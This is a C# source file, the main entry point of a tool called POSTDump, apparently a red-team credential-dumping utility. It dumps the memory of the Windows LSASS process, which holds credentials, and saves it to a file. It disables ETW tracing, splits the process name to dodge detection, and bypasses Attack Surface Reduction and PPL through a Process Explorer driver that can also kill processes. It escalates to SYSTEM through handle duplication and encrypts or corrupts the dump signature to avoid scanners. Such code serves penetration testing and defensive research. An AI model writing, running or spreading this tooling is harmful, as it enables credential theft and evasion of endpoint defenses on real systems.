using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using Data = POSTMiniDump.Data;
using Minidump = POSTMiniDump.MiniDump;
using MinidumpUtils = POSTMiniDump.Utils;

namespace POSTDump
{
    internal class Postdump
    {

        public static ISyscall isyscall = new ISyscall();

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref ulong RegionSize, uint AllocationType, uint Protect);

        static void Help()
        {
            Console.WriteLine(@"" +
                "-e, --encrypt - Encrypt dump in-memory\n" +
                "-s, --signature - Generate invalid Minidump signature\n" +
                "-o, --outfile - Output file where to write dump\n" +
                "--snap - Use snapshot technic\n" +
                "--fork - Use fork technic [default]\n" +
                "--duplicate-elevate - Look for existing lsass handle to duplicate and elevate\n" +
                "--elevate-handle - Open a handle to LSASS with low privileges and duplicate it to gain higher privileges\n" +
                "--asr - Attempt LSASS dump using ASR bypass (win10/11/2019) (no signature/no encrypt)\n" +
                "--driver - Use Process Explorer driver to open lsass handle (bypass PPL) and dump lsass\n" +
                "--kill [processID] - Use Process Explorer driver to kill process and exit\n" +
                "--help - Display help" +
                "");
            return;
        }

        public static void Main(string[] args)
        {
            string filename = System.Environment.MachineName + "_" + DateTime.Now.ToString("ddMMyyyy_HH-mm") + ".dmp";
            bool Encrypt = false;
            bool Signature = false;
            bool Elevate = false;
            bool driver = false;
            bool Kill = false;
            bool Asr = false;
            string Output = string.Empty;
            int processid = 0;
            string tech = "fork";

            foreach (string arg in args)
            {
                if (arg.Equals("--signature") || arg.Equals("-s"))
                {
                    Signature = true;
                }
                if (arg.Equals("--encrypt") || arg.Equals("-e"))
                {
                    Encrypt = true;
                }
                if (arg.Equals("--snap"))
                {
                    tech = "snapshot";
                }
                if (arg.Equals("--fork"))
                {
                    tech = "fork";
                }
                if (arg.Equals("--elevate-handle"))
                {
                    Elevate = true;
                }
                if (arg.Equals("--duplicate-elevate"))
                {
                    tech = "duplicate";
                }
                if (arg.Equals("--outfile") || arg.Equals("-o"))
                {
                    int i = Array.IndexOf(args, arg);
                    Output = args[i + 1];
                }
                if (arg.Equals("--driver"))
                {
                    driver = true;
                }
                if (arg.Equals("--kill"))
                {
                    Kill = true;
                    int i = Array.IndexOf(args, arg);
                    processid = int.Parse(args[i + 1]);
                }
                if (arg.Equals("--asr"))
                {
                    Asr = true;
                }
                if (arg.Equals("--help"))
                {
                    Help();
                    return;
                }
            }

            if (Output.Equals(string.Empty))
            {
                Output = filename;
            }

            isyscall.PatchETW();

            if (Asr)
            {
                if (ASR.Run())
                    Console.WriteLine("Done! Check for existing lsass.dmp file into current folder");

                return;
            }

            string ProcName = "l" + "sa" + "ss";
            Process proc = Process.GetProcessesByName(ProcName)[0];
            int lsassid = proc.Id;

            IntPtr procHandle = IntPtr.Zero;
            IntPtr dumpHandle = IntPtr.Zero;
            IntPtr snapHandle = IntPtr.Zero;
            uint desiredAccess = 0;
            bool successTech = false;
            bool successDump = false;
            ulong region_size = Data.DUMP_MAX_SIZE;

            Data.dump_context dc = new Data.dump_context();
            dc.DumpMaxSize = region_size;
            dc.BaseAddress = IntPtr.Zero;
            dc.rva = 0;
            dc.Signature = Data.MINIDUMP_SIGNATURE;
            dc.Version = Data.MINIDUMP_VERSION;
            dc.ImplementationVersion = Data.MINIDUMP_IMPL_VERSION;

            if (processid > 0) 
            {
                if (!Process.GetProcesses().Any(x => x.Id == processid))
                {
                    Console.WriteLine("Invalid process id");
                    return;
                }
                if (Kill)
                {
                    Driver.Kill(processid, out dc.hProcess, false, false);
                    return;
                }
            }         

            if (driver)
            {
                Driver.Kill(lsassid, out dc.hProcess, true, false);
            }

            //Allocate memory for dump
            IntPtr ntallocptr = isyscall.GetSyscallPtr("NtAllocateVirtualMemory");
            NtAllocateVirtualMemory NTAVM = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntallocptr, typeof(NtAllocateVirtualMemory));
            Data.NTSTATUS status = NTAVM(new IntPtr(-1), ref dc.BaseAddress, IntPtr.Zero, ref region_size, 0x1000, 0x04); //MEM_COMMIT, PAGE_READWRITE
            if (status != 0)
            {
                Console.WriteLine("Could not allocate memory for the dump!");
                return;
            }


            if (driver && dc.hProcess == IntPtr.Zero)
            {
                Console.WriteLine("Driver technic failed, trying default method..");
                if (Elevate)
                {
                    if (!Handle.GetProcessHandle(lsassid, out procHandle, (uint)0x1000)) //PROCESS_QUERY_LIMITED_INFORMATION
                    {
                        Console.WriteLine("Open process failed!");
                        return;
                    }

                    if (!Handle.escalate_to_system())
                    {
                        Console.WriteLine("GetSystem failed!");
                        return;
                    }

                    if (tech == "snapshot")
                    {
                        desiredAccess = (uint)0x0400 | (uint)0x0080; //PROCESS_QUERY_INFORMATION, PROCESS_CREATE_PROCESS
                    }
                    else if (tech == "fork")
                    {
                        desiredAccess = (uint)0x0080; //PROCESS_CREATE_PROCESS
                    }

                    if (!Handle.ElevateHandle(procHandle, desiredAccess, 0, out dumpHandle))
                    {
                        Console.WriteLine("Elevate handle failed.");
                        return;
                    }
                }

                if (tech == "snapshot")
                {
                    if (!Elevate)
                    {
                        if (!Handle.GetProcessHandle(lsassid, out dumpHandle, (uint)0x0400 | (uint)0x0080)) //PROCESS_QUERY_INFORMATION, PROCESS_CREATE_PROCESS
                        {
                            Console.WriteLine("Getting lsass handle failed!");
                            return;
                        }
                    }

                    successTech = Handle.Snapshot(dumpHandle, out dc.hProcess, out snapHandle);
                }

                else if (tech == "fork")
                {
                    if (!Elevate)
                    {
                        if (!Handle.GetProcessHandle(lsassid, out dumpHandle, (uint)0x0080)) //PROCESS_CREATE_PROCESS
                        {
                            Console.WriteLine("Getting lsass handle failed!");
                            return;
                        }
                    }

                    successTech = Handle.Fork(dumpHandle, out dc.hProcess);
                }

                else if (tech == "duplicate")
                {
                    List<IntPtr> hDupHandles = Handle.FindDupHandles((int)lsassid);
                    if (hDupHandles.Count == 0)
                    {
                        Console.WriteLine("No handle to duplicate found.");
                        return;
                    }

                    if (!Handle.escalate_to_system())
                    {
                        Console.WriteLine("GetSystem failed!");
                        return;
                    }

                    desiredAccess = 0x1000 | 0x0010; //PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_READ
                    foreach(IntPtr hDuped in hDupHandles)
                    {
                        if (Handle.ElevateHandle(hDuped, desiredAccess, 0, out dc.hProcess))
                        {
                            successTech = true;
                            Console.WriteLine("Elevate handle success.");
                            break;
                        }
                    } 
                }

                if (!successTech)
                {
                    Console.WriteLine($"{tech} failed.");
                    return;
                }
            }

            successDump = Minidump.POSTDumpWriteDump(dc, Signature, Encrypt);
            if (!successDump)
            {
                Console.WriteLine("Dump failed !");
                return;
            }
            else
            {
                Console.WriteLine("Dump success !");
            }

            var success = MinidumpUtils.WriteFile(Output, dc.BaseAddress, dc.rva, out IntPtr hFile);
            if (success)
            {
                Console.WriteLine($"Dump saved to {Output}");
                if (Signature && Encrypt)
                {
                    Console.WriteLine($"The dump has an invalid signature and is encrypted, to restore it run:\npython3 dump-restore.py {Output} --type both");
                }
                else if (Signature)
                {
                    Console.WriteLine($"The dump has an invalid signature, to restore it run:\npython3 dump-restore.py {Output} --type restore");
                }
                else if (Encrypt)
                {
                    Console.WriteLine($"The dump is encrypted, to restore it run:\npython3 dump-restore.py {Output} --type decrypt");
                }
            }
            
            Handle.cleanup(dc.hProcess, tech, snapHandle);

            if (dc.BaseAddress != IntPtr.Zero)
                MinidumpUtils.erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
        }
    }
}

